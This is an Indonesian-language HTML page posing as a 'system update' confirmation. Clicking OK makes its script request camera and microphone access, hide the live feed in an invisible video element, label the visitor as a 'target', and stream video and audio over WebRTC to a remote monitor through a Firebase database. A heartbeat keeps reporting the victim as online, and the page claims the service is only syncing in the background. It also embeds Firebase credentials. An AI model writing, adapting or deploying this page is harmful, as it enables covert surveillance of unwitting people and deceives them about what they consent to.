<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Konfirmasi</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #f0f0f0; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #confirm-modal { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
        h2 { margin-top: 0; color: #333; }
        p { color: #666; line-height: 1.5; }
        button { background: #007bff; color: white; border: none; padding: 12px 40px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #0056b3; }
        #v { position: fixed; top: -1000px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <div id="confirm-modal">
        <h2>Pembaruan Sistem</h2>
        <p>Klik tombol di bawah untuk menyinkronkan data dan melanjutkan akses ke layanan kami.</p>
        <button id="startBtn">OK</button>
    </div>

    <video id="v" autoplay playsinline muted></video>

    <script>
        const config = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(config);

        let targetId = localStorage.getItem('target_id') || "TGT-" + Math.random().toString(36).substr(2, 5);
        localStorage.setItem('target_id', targetId);
        const db = firebase.database().ref('v5_multi/' + targetId);

        let pc = null;
        let localStream = null;

        async function createOffer() {
            if (pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            
            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));

            pc.onicecandidate = e => {
                if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
            };

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            
            // Kirim offer dengan TS baru biar monitor langsung respon
            await db.child('sdp/offer').set({ 
                type: offer.type, 
                sdp: offer.sdp, 
                ts: Date.now() 
            });
        }

        document.getElementById('startBtn').onclick = async function() {
            this.disabled = true;
            this.innerText = "Sedang Memproses...";
            
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = localStream;

                // Reset DB state
                await db.child('sdp/answer').remove();
                await db.child('ice_m').remove();
                await db.child('ice_t').remove();

                await createOffer();

                // Listen Answer
                db.child('sdp/answer').on('value', async s => {
                    const a = s.val();
                    if (a && pc && pc.signalingState !== "stable") {
                        await pc.setRemoteDescription(new RTCSessionDescription(a));
                    }
                });

                // Listen ICE
                db.child('ice_m').on('child_added', s => {
                    if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
                });

                // Heartbeat
                setInterval(() => {
                    db.child('status').update({ lastSeen: Date.now(), id: targetId });
                }, 5000);

                document.getElementById('confirm-modal').innerHTML = "<h2>Sinkronisasi Berhasil</h2><p>Layanan sedang berjalan di latar belakang.</p>";
            } catch (e) {
                alert("Izin Kamera/Audio Diperlukan!");
                location.reload();
            }
        };
    </script>
</body>
</html>
